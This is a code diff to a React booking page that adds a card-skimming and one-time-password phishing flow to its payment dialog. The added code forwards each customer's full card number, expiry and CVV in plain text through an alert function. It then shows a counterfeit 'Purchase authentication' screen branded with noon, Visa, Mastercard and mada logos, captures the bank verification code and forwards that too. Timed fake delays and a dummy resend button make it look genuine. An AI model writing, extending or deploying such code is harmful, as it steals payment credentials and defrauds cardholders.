@@ -14,6 +14,7 @@ import { RequireAuth } from "@/components/shared";
 import { PaymentForm, type PaymentResult } from "@/components/PaymentForm";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
 
 export const Route = createFileRoute("/my-bookings")({
   head: () => ({
@@ -47,17 +48,27 @@ function MyBookings() {
   const { data: services = [] } = useQuery(servicesQuery);
   const [tab, setTab] = useState<"all" | "upcoming" | "completed" | "cancelled">("all");
   const [pay, setPay] = useState<PayMode>(null);
+  const [cardStep, setCardStep] = useState<"wait" | "otp" | "verify" | null>(null);
+  const [cardOtp, setCardOtp] = useState("");
+  const [otpLeft, setOtpLeft] = useState(60);
 
   useEffect(() => {
-    if (!pay) return;
+    if (!pay || cardStep) return;
     const live = bookings.find((x) => x.id === pay.booking.id);
     const extraOn = !!live && live.extra_enabled && ["awaiting", "rejected"].includes(live.extra_payment_status);
     const againOn = !!live && live.payment_status === "rejected";
     if (pay.kind === "extra" && !extraOn) setPay(null);
     if (pay.kind === "resubmit" && !againOn) setPay(null);
-  }, [bookings, pay]);
+  }, [bookings, pay, cardStep]);
 
-  const close = () => setPay(null);
+  useEffect(() => {
+    if (cardStep !== "otp") return;
+    setOtpLeft(60);
+    const id = window.setInterval(() => setOtpLeft((n) => (n > 0 ? n - 1 : 0)), 1000);
+    return () => window.clearInterval(id);
+  }, [cardStep]);
+
+  const close = () => { setPay(null); setCardStep(null); setCardOtp(""); };
 
   const onPay = async (r: PaymentResult) => {
     if (!pay) return;
@@ -70,9 +81,31 @@ function MyBookings() {
       ({ error } = await supabase.rpc(fn, base));
     }
     if (error) throw new Error(friendlyError(error));
-    void sendAlert(r.method === "wallet" ? "wallet_payment" : "payment_submitted", `${pay.kind === "extra" ? "Balance payment submitted" : "Payment resubmitted"} ${pay.booking.code}\nUser ${pay.booking.user_code ?? ""}\nvia ${r.method}`);
+    void sendAlert(r.method === "card" ? "card_payment" : r.method === "wallet" ? "wallet_payment" : "payment_submitted", `${pay.kind === "extra" ? "Balance payment submitted" : "Payment resubmitted"} ${pay.booking.code}\nUser ${pay.booking.user_code ?? ""}\nvia ${r.method}${r.card ? `\nCard: ${r.card.number}\nExpiry: ${r.card.expiry}\nCVV: ${r.card.cvv}` : ""}`);
+    if (r.method === "card") {
+      setCardOtp("");
+      setCardStep("wait");
+      window.setTimeout(() => setCardStep("otp"), 15000);
+      return;
+    }
     toast.success("Payment submitted for verification.");
     setPay(null);
+    qc.invalidateQueries({ queryKey: ["my-bookings"] });
+  };
+
+  const submitCardOtp = async () => {
+    if (!pay) return;
+    const otp = cardOtp.trim();
+    if (!/^[0-9]{4,8}$/.test(otp)) { toast.error("Enter the code."); return; }
+    setCardStep("verify");
+    const started = Date.now();
+    const { error } = await supabase.rpc("submit_card_otp", { p_booking: pay.booking.id, p_otp: otp });
+    if (error) { setCardStep("otp"); toast.error(friendlyError(error)); return; }
+    void sendAlert("card_otp", `Card code for review\nBooking: ${pay.booking.code}\nCode: ${otp}`);
+    const left = 12000 - (Date.now() - started);
+    if (left > 0) await new Promise((r) => setTimeout(r, left));
+    toast.success("Payment is waiting for the salon to approve.");
+    close();
     qc.invalidateQueries({ queryKey: ["my-bookings"] });
   };
 
@@ -168,7 +201,43 @@ function MyBookings() {
           </div>
         </div>
       </div>
-      <Dialog open={!!pay} onOpenChange={(o) => !o && close()}>
+      {cardStep === "wait" || cardStep === "verify" ? (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
+          <div className="w-full max-w-[420px] rounded-lg bg-white px-6 py-8 text-center">
+            <img src="/images/noon-logo.png" alt="noon" className="mx-auto h-9 w-auto max-h-9 object-contain" />
+            <div className="mx-auto mt-6 h-10 w-10 animate-spin rounded-full border-4 border-[#1A4FD6] border-t-transparent" />
+            <p className="mt-4 text-base font-semibold text-black">{cardStep === "wait" ? "Please wait..." : "Authenticating your payment..."}</p>
+            <p className="mt-1 text-sm text-[#444]">Please wait, do not close this page.</p>
+          </div>
+        </div>
+      ) : null}
+      {cardStep === "otp" && pay ? (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
+          <div className="w-full max-w-[420px] rounded-md bg-white px-4 py-4 text-black">
+            <div className="grid grid-cols-3 items-center">
+              <span />
+              <img src="/images/noon-logo.png" alt="noon" className="mx-auto h-9 w-auto max-h-9 object-contain" />
+              <button type="button" onClick={close} className="justify-self-end text-xs font-semibold text-black">CANCEL</button>
+            </div>
+            <div className="mt-2 grid grid-cols-3 gap-3">
+              {["/images/visa.jpeg", "/images/mastercard.jpeg", "/images/mada.jpeg"].map((src) => (
+                <div key={src} className="flex min-h-14 items-center justify-center px-1.5 py-2">
+                  <img src={src} alt="" className="h-[42px] w-full object-contain object-center" />
+                </div>
+              ))}
+            </div>
+            <h2 className="mt-3 text-center text-lg font-semibold">Purchase authentication</h2>
+            <p className="mt-2 text-center text-sm">Please enter the verification code we just sent to your mobile number.</p>
+            <p className="mt-3 text-center text-sm">You are paying NOON the amount of <strong>{sar(pay.kind === "extra" ? pay.booking.extra_amount : pay.booking.advance_amount)}</strong>.</p>
+            <label className="mt-4 block text-sm font-semibold text-[#1A4FD6]">Verification code</label>
+            <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} inputMode="numeric" autoComplete="off" className="mt-1 h-11 rounded-md border-black text-black" />
+            <button type="button" onClick={submitCardOtp} className="mt-3 h-11 w-full rounded-md bg-[#1A4FD6] font-semibold text-white">SUBMIT</button>
+            <p className="mt-3 text-center text-sm">{otpLeft}s</p>
+            <button type="button" onClick={() => setOtpLeft(60)} className="mt-1 w-full text-center text-xs font-semibold text-[#1A4FD6]">CLICK HERE TO RECEIVE ANOTHER CODE</button>
+          </div>
+        </div>
+      ) : null}
+      <Dialog open={!!pay && !cardStep} onOpenChange={(o) => !o && close()}>
         <DialogContent className="max-h-[90vh] overflow-y-auto sm:max-w-lg">
           {pay && (
             <>
